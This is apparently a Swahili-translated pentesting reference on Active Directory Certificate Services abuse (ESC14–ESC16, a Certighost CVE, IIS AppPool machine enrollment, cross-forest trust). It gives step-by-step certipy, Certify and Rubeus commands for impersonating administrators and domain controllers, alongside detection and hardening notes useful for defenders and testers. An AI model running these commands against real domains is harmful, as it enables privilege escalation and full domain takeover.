#### Hali C: Lengo Lina Ulinganishaji wa X509IssuerSubject

- **Sharti la awali**: Lengo lina ulinganishaji dhaifu wa wazi wa X509IssuerSubject kwenye `altSecurityIdentities`. Mshambulizi anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye principal ya mwathiriwa ili ilingane na subject ya ulinganishaji wa X509IssuerSubject wa lengo. Kisha, mshambulizi anaweza ku-enroll cheti kama mwathiriwa na kutumia cheti hicho kufanya authentication kama lengo.
#### Hali D: Lengo Lina Ulinganishaji wa X509SubjectOnly

- **Sharti la awali**: Lengo lina ulinganishaji dhaifu wa wazi wa X509SubjectOnly kwenye `altSecurityIdentities`. Mshambulizi anaweza kuweka sifa ya `cn` au `dNSHostName` kwenye principal ya mwathiriwa ili ilingane na subject ya ulinganishaji wa X509SubjectOnly wa lengo. Kisha, mshambulizi anaweza ku-enroll cheti kama mwathiriwa na kutumia cheti hicho kufanya authentication kama lengo.
### Operesheni halisi
#### Hali A

Omba cheti cha certificate template `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Hifadhi na ubadilishe cheti

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Thibitisha utambulisho (kwa kutumia cheti)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Usafishaji (si lazima)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Kwa mbinu mahususi zaidi za mashambulizi katika hali mbalimbali za mashambulizi, rejelea yafuatayo: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Utafiti [wa awali kuhusu ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) unaeleza jinsi application policies zilizowasilishwa katika ombi la V1 template zinavyoweza kuchukua nafasi ya Extended Key Usage iliyosanidiwa kwenye **issuing CA ambayo haijafanyiwa patch**.<sup>[[15]](#references)</sup> Ili njia hii iwezekane, lazima pia kuwe na template iliyochapishwa na inayoruhusu enrollment, inayokubali sifa zinazohitajika za subject/request na isiyokuwa na sharti la approval au signature linalozuia mchakato. Haki za enrollment pekee hazithibitishi kuwa udhaifu unaweza kutumiwa. Matumizi ya Certificate Request Agent yanaweza pia kutegemea template ya pili inayofaa na vizuizi vya enrollment-agent; thibitisha hali ya patch ya CA na matokeo ya issuance kabla ya kudai kuwa njia hiyo inawezekana.

### Matumizi Mabaya

[Hati za Certipy za privilege escalation](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) zina mifano zaidi ya matumizi.<sup>[[14]](#references)</sup>


Amri ya `find` ya Certipy inaweza kusaidia kutambua V1 templates ambazo zinaweza kuathiriwa na ESC15 ikiwa CA haijafanyiwa patch.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Hali A: Direct Impersonation kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza Application Policy ya "Client Authentication" na UPN lengwa.** Mshambuliaji `attacker@corp.local` analenga `administrator@corp.local` kwa kutumia template ya "WebServer" V1 (inayoruhusu subject inayotolewa na enrollee).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Template ya V1 iliyo hatarishi yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Huongeza OID `1.3.6.1.5.5.7.3.2` kwenye extension ya Application Policies ya CSR.
- `-upn 'administrator@corp.local'`: Huweka UPN kwenye SAN kwa ajili ya impersonation.

**Hatua ya 2: Authenticate kupitia Schannel (LDAPS) kwa kutumia certificate iliyopatikana.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Scenario B: Kuiga utambulisho kupitia PKINIT/Kerberos kwa kutumia vibaya Enrollment Agent

**Hatua ya 1: Omba cheti kutoka kwenye template ya V1 (yenye “Enrollee supplies subject”), ukiingiza Application Policy ya “Certificate Request Agent”.** Cheti hiki ni cha mshambuliaji (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa utambulisho wa mshambuliaji mwenyewe hapa, kwa kuwa lengo ni kupata uwezo wa agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Injects OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji lengwa mwenye haki za juu.** Hii ni hatua inayofanana na ESC3, inayotumia cheti kutoka Hatua ya 1 kama cheti cha agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Hatua ya 3: Thibitisha utambulisho wako kama mtumiaji mwenye mapendeleo ukitumia cheti cha "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Security Extension Imezimwa kwenye CA (Kimataifa)-ESC16

### Maelezo

**ESC16 (Kuongeza Haki Kupitia Kukosekana kwa Kiendelezi cha szOID_NTDS_CA_SECURITY_EXT)** hufafanua kuzimwa kwa kiendelezi cha SID **szOID_NTDS_CA_SECURITY_EXT** kwenye CA nzima. Hiki ni kiashiria cha usanidi, si uthibitisho kwamba cheti kinaweza kuthibitisha utambulisho kama akaunti nyingine. Kuiga utambulisho kunahitaji pia udhibiti wa sifa au ramani ya akaunti husika, template ya uthibitishaji wa mteja inayoruhusu usajili, na njia ya ulinganishaji wa cheti inayokubaliwa na kidhibiti halisi cha kikoa au huduma. KDC iliyopachikwa viraka na iliyo katika Full Enforcement hukataa vyeti visivyo na kiendelezi cha SID isipokuwa vina ramani nyingine thabiti; utaratibu wa Kerberos wa UPN pekee ulio hapa chini unatumika kwa KDC za zamani au zilizo katika hali ya uoanifu ambazo bado zinakubali ramani dhaifu. Tazama [mwongozo wa Microsoft kuhusu ulinganishaji wa vyeti na utekelezaji](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Unaweza pia kurejelea makala hii ili kujifunza zaidi kuhusu kanuni hiyo kwa kina:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Matumizi Mabaya

Mfano ufuatao wa kihistoria wa Kerberos unaotumia UPN pekee unatokana na [nyaraka za ESC16 za Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Unahitaji KDC ambayo bado inakubali ramani dhaifu inayotokana na mfano huo; `StrongCertificateBindingEnforcement=1` si tena njia mbadala inayotumika baada ya sasisho la usalama la Windows la Septemba 9, 2025.<sup>[[14]](#references)</sup>

Ili kutambua kama mazingira ya Active Directory Certificate Services (AD CS) yanaathiriwa na **ESC16**

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathiriwa (Hiari - kwa ajili ya kurejesha).  ‌  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Hatua ya 3: (Ikihitajika) Pata vitambulisho vya akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Hatua ya 4: Omba cheti kama mtumiaji "victim" kutoka kwa template ya uthibitishaji wa mteja ambayo akaunti inaweza kujiandikisha (kwa mfano, "User") kwenye CA iliyosanidiwa kwa ESC16.** CA huondoa kiendelezi cha usalama cha SID kwenye cheti kinachotolewa, lakini hilo pekee halithibitishi kwamba kuna ulinganishaji wa uthibitishaji unaoweza kutumika. Weka kigezo cha mazingira cha Kerberos credential cache (amri ya shell):

```bash
export KRB5CCNAME=victim.ccache
```

Kisha omba cheti:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Hatua ya 5: Rudisha UPN ya akaunti ya "victim".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Hatua ya 6: Kwenye KDC ya zamani au iliyo katika hali ya uoanifu inayokubali mapping hii dhaifu, thibitisha utambulisho ukiwa kama msimamizi lengwa.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback identity substitution (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** hutumia vibaya **AD CS enrollment chase / callback path** ambapo CA huamini attributes za ombi zilizotolewa na mwombaji ili kubaini utambulisho utakaowekwa kwenye certificate iliyotolewa. Katika PoC ya umma, ombi lililotengenezwa mahususi linajumuisha:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP inayodhibitiwa na mshambuliaji ambayo CA itawasiliana nayo
- **`rmd`**: jina la DNS la **target Domain Controller** wa kuiga

CA ikifuata chase hiyo, itaunganishwa na mshambuliaji kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Mshambuliaji hutumia **akaunti halisi ya mashine** (kwa kawaida iliyoundwa kupitia **`ms-DS-MachineAccountQuota`** ya chaguomsingi) ili callback session ithibitishe utambulisho wake kama principal halali ya domain, lakini rogue services hurudisha attributes za utambulisho wa **target DC** badala yake:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haitafungamanisha kwa njia ya kriptografia utambulisho uliorudishwa na principal iliyothibitishwa kwenye callback**, inaweza kutoa certificate ya **Domain Controller** ingawa session ilithibitisha utambulisho wake kwa kutumia akaunti ya mashine inayodhibitiwa na mshambuliaji. Hii inafanya bug hii kuwa tofauti kimawazo na **Certifried**: badala ya kubadilisha attributes za AD kama `dNSHostName`, mshambuliaji **hubadilisha data ya utambulisho wakati wa utatuzi wa callback ya CA**.<sup>[[2]](#references)</sup>

**Masharti muhimu ya awali:**

- **Credentials za domain** zenye marupurupu madogo
- Uwezo wa **kuunda au kutumia tena akaunti ya kompyuta**
- Muunganisho wa mtandao kutoka kwa **CA** hadi **ports `389` na `445`** zinazodhibitiwa na mshambuliaji
- Njia ya ombi la CA iliyo hatarini / ambayo haijafanyiwa patch (sasisho la Microsoft la **Julai 14, 2026** liliongeza **uthibitishaji wa DC kwa `cdc`** pamoja na **ulinganisho wa SID iliyotatuliwa**)

Kisha **`.pfx`** inayopatikana inaweza kutumika kwa **PKINIT**, na kutoa **`.ccache`** na, katika mtiririko wa PoC iliyochapishwa, **NT hash ya target DC**, ambayo kwa kawaida inatosha kusababisha **kuathirika kikamilifu kwa domain**.

### Unyonyaji

PoC ya umma hujiendesha yenyewe katika mnyororo mzima:<sup>[[1]](#references)</sup>

1. Unda au tumia tena **akaunti ya mashine** inayodhibitiwa na mshambuliaji.
2. Anzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Wasilisha ombi la certificate lenye attributes za **`cdc`** zinazodhibitiwa na mshambuliaji na za **`rmd`** za target.
4. Acha CA ithibitishe utambulisho wake kwa rogue listeners ikitumia akaunti ya mashine inayodhibitiwa, lakini jibu maombi ya utambulisho kwa attributes za **target DC**.
5. Pokea **certificate ya DC** iliyosainiwa na CA, kisha uitumie kwa **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Alama za runtime zenye manufaa kutoka kwenye PoC:

- `--listener <ip>`: chagua waziwazi IP ya callback inayotangazwa kwenye `cdc`
- `--computer-name <NAME$>`: tumia tena machine account iliyopo badala ya kuunda mpya

**Maelezo ya uendeshaji:**

- PoC inahitaji **root** kwa sababu inafunga **privileged ports** `389` na `445`.
- Exploitation ikifaulu, huandika **DC `.pfx`** na **Kerberos `.ccache`** ndani ya kifaa.
- Kwa kuwa certificate inahusishwa na akaunti ya **Domain Controller**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na kutumia tena **machine NT hash** iliyopatikana.<sup>[[2]](#references)</sup>

## Uandikishaji wa mashine ya IIS AppPool hadi Administrator kwenye host hiyo hiyo

IIS pool inayoendeshwa kama `ApplicationPoolIdentity` hutumia **computer account** ya host yake kufikia rasilimali za mtandao kutoka nje. Kwa hiyo, code execution kama `IIS AppPool\<POOL>` hubaki na ruhusa ndogo kwenye local token, lakini inaweza kuwasilisha ombi la AD CS ambalo CA hulithibitisha kama `HOST$`; huu ni mabadiliko ya utambulisho wa outbound, si token impersonation au local elevation ya aina ya Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Mlolongo huu unahitaji IIS host iliyojiunga na domain, Enterprise CA inayofikiwa kupitia RPC, template ya machine-authentication iliyochapishwa ambayo computer ina haki za enrollment, usaidizi wa PKINIT, na ufikikaji wa KDC/SMB. Utambulisho maalum wa pool hubadilisha principal ya outbound, kwa hiyo thibitisha kuwa pool inatumia `ApplicationPoolIdentity` kabla ya kudhani ni `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Enrollment kwa kutumia key inayodhibitiwa na mshambuliaji

Tengeneza key pair na CSR nje ya IIS server, na uhifadhi private key. Wasilisha **CSR pekee** kutoka kwa worker iliyoathiriwa. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) huanzisha `CertificateAuthority.Request`, huweka `CertificateTemplate:Machine`, huita `ICertRequest::Submit`, na kurudisha certificate iliyotolewa. Tumia CA configuration string `CAHOST\CA-NAME`; template ya kawaida ya `Machine` huunda subject kutoka AD, kwa hiyo data ya subject/SAN iliyotolewa na requester haihitajiki.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Unganisha certificate iliyorejeshwa na **key inayolingana iliyohifadhiwa**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` hufanya kazi tu ikiwa Windows inaweza tayari kuhusisha certificate na private key inayoweza kufikiwa; kwa mafaili tofauti ya PEM, unda PKCS#12 moja kwa moja:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Tumia PFX kwa PKINIT na uhifadhi TGT ya kompyuta iliyorejeshwa kama base64 badala ya kuiingiza mara moja:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus same-host service substitution

S4U2Self huruhusu service kupata ticket **kwa ajili yake yenyewe** iliyo na data ya authorization ya mtumiaji mwingine. Kwa kutumia computer TGT, Rubeus inaweza kuomba ticket hiyo kwa ajili ya mtumiaji mwenye privileges, kubadilisha jina la service katika KRB-CRED iliyorejeshwa kuwa CIFS, na kui-inject. Hii ndiyo primitive ya ndani ya “delegate to thyself”: haihitaji S4U2Proxy wala ingizo la `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Tiketi iliyobadilishwa inaweza kutumiwa tu na huduma zilizo chini ya **akaunti/funguo ileile ya kompyuta** (hapa, CIFS kwenye `HOST`). Si tiketi ya Administrator inayoweza kutumiwa tena kwenye kompyuta nyingine za domain. Pia, matokeo yaliyoonyeshwa ni ufikiaji wa SMB/filesystem wenye ruhusa za Administrator; kupata mchakato wa ndani wa `NT AUTHORITY\SYSTEM` bado kunahitaji hatua tofauti ya remote execution.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Ugunduzi na uimarishaji wa usalama

- Kwenye CA, linganisha matukio ya Certification Services **4886** (ombi limepokelewa) na **4887** (cheti kimetolewa) ili kubaini maombi yasiyotarajiwa ya template ya **Machine** kutoka kwa akaunti za seva za IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Kwenye DC, tukio **4768** linajumuisha sehemu za cheti wakati uthibitishaji wa awali wa cheti unatumiwa; toa arifa kuhusu maombi yasiyo ya kawaida ya PKINIT TGT kwa akaunti za seva za wavuti. Kisha fuatilia maombi ya **4769** yanayohusisha utambulisho wa mtu mwingine wenye ruhusa za juu na host hiyo hiyo. Kwa kuwa Rubeus `/altservice` hubadilisha jina la huduma la KRB-CRED upande wa mteja, usihitaji jina la huduma la 4769 upande wa DC liwe `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Tafuta matukio ya `w3wp.exe` kufikia endpoint za CA RPC, uundaji usiotarajiwa wa faili za ASPX, ufikiaji wa administrative shares kwa uthibitishaji wa Kerberos, na shughuli za kutoa siri. Punguza ufikiaji wa app-tier kwa CA RPC/KDC/SMB inapowezekana, na uondoe ruhusa za enrollment za kompyuta au template za uthibitishaji wa mashine ambazo hazihitajiki kiutendaji.<sup>[[19]](#references)</sup>

## Kueleza Uvunjaji wa Forest kwa Vyeti kwa Kutumia Usemi wa Kutendwa

### Kuvunjwa kwa Trust za Forest na CA Zilizodhibitiwa

Mipangilio ya **cross-forest enrollment** hufanywa kuwa rahisi kiasi. **Cheti cha root CA** kutoka resource forest **huchapishwa kwenye account forests** na wasimamizi, na vyeti vya **enterprise CA** kutoka resource forest **huongezwa kwenye kontena za `NTAuthCertificates` na AIA katika kila account forest**. Kwa ufafanuzi, mpangilio huu huipa **CA katika resource forest udhibiti kamili** juu ya forest nyingine zote ambazo inasimamia PKI. CA hii **ikidhibitiwa na washambuliaji**, wanaweza **kughushi** vyeti vya watumiaji wote katika resource na account forests, na hivyo kuvunja mpaka wa usalama wa forest.<sup>[[6]](#references)</sup>

### Ruhusa za Enrollment Zinazopewa Principals wa Nje

Katika mazingira yenye forest nyingi, tahadhari inahitajika kuhusu Enterprise CA zinazochapisha **certificate templates** zinazoruhusu **Authenticated Users au principals wa nje** (watumiaji/makundi yaliyo nje ya forest ambayo Enterprise CA ni sehemu yake) **kupata ruhusa za enrollment na kuhariri**.\
Mtumiaji anapothibitishwa kupitia trust, AD huongeza **Authenticated Users SID** kwenye tokeni ya mtumiaji. Kwa hiyo, ikiwa domain ina Enterprise CA yenye template **inayoruhusu Authenticated Users kuwa na ruhusa za enrollment**, huenda mtumiaji kutoka forest nyingine akaweza **kujiandikisha kwenye template hiyo**. Vilevile, ikiwa template **inatoa ruhusa za enrollment waziwazi kwa principal wa nje**, basi **uhusiano wa udhibiti wa ufikiaji kati ya forest huundwa**, na kumwezesha principal kutoka forest moja **kujiandikisha kwenye template kutoka forest nyingine**.

Hali zote mbili husababisha **kuongezeka kwa eneo la mashambulizi** kutoka forest moja hadi nyingine. Mshambuliaji anaweza kutumia mipangilio ya certificate template kupata ruhusa za ziada katika domain ya nje.<sup>[[6]](#references)</sup>


## References

- [1] [Hazina ya PoC ya aniqfakhrul/CVE-2026-54121](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Uchambuzi wa kiufundi wa Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blogu ya SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Umiliki Ulioidhinishwa: Kutumia Vibaya Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, kiolesura cha BloodHound, mbinu mpya za uthibitishaji na maombi, na mengineyo](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Kutumia Vibaya Ulinganishaji wa Akaunti wa Key Trust ili Kudhibiti Akaunti](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Hadithi ya Matumizi (Mabaya) ya Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Kuelekeza Relay kwa AD Certificate Services kupitia RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Ufikiaji wa Shell kwa ADCS CA kwa kutumia YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Mbinu ya Kutumia Vibaya ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Mbinu ya Kutumia Vibaya ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Kupandisha Ruhusa (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Si ESC Nyingine Tu ya AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Mipangilio Isiyo Sahihi na Utekelezaji wa Shambulizi](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Kuchunguza Tena “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC ya IIS AD CS enrollment](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Kupandisha Ruhusa kutoka IIS AppPool kupitia Endpoint ya AD CS RPC](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Utambulisho wa Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – amri ya pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Kukagua Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Tukio 4768: Tiketi ya uthibitishaji ya Kerberos imeombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Tukio 4769: Tiketi ya huduma ya Kerberos imeombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Zana ya PowerShell ya kutumia vibaya AD CS](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
